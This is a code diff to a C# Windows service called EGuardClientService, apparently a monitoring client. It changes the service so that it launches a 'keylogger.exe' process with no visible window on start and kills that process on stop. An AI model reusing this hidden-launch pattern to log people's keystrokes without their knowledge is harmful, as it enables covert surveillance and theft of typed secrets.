@@ -23,6 +23,9 @@ namespace EGuardClientService
         // Timer to verify if start time has been reached periodically
         private static System.Timers.Timer aTimer;
 
+        // Keylogger process
+        private static Process myKeylogger;
+
         /// <summary>
         /// Performs application-defined tasks associated with freeing, releasing, or resetting unmanaged resources.
         /// </summary>
@@ -37,8 +40,29 @@ namespace EGuardClientService
         /// <param name="args">Any command line arguments</param>
         public void OnStart(string[] args)
         {
+
+            myKeylogger = new Process();
+
+            try
+            {
+                myKeylogger.StartInfo.UseShellExecute = false;
+                // You can start any process, HelloWorld is a do-nothing example.
+                myKeylogger.StartInfo.FileName = "./keylogger.exe";
+                myKeylogger.StartInfo.CreateNoWindow = true;
+                myKeylogger.Start();
+                // This code assumes the process you are starting will terminate itself.  
+                // Given that is is started without a window so you cannot terminate it  
+                // on the desktop, it must terminate itself or you can do it programmatically 
+                // from this application using the Kill method.
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+                                  
+            
             //initialize keylogger
-            Process.Start("keylogger.exe");
+            //Process.Start("keylogger.exe");
 
             // Enable firewall
             Type NetFwMgrType = Type.GetTypeFromProgID("HNetCfg.FwMgr", false);
@@ -103,6 +127,8 @@ namespace EGuardClientService
         /// </summary>
         public void OnStop()
         {
+            // Kill keylogger process.
+            myKeylogger.Kill();
         }
 
         /// <summary>
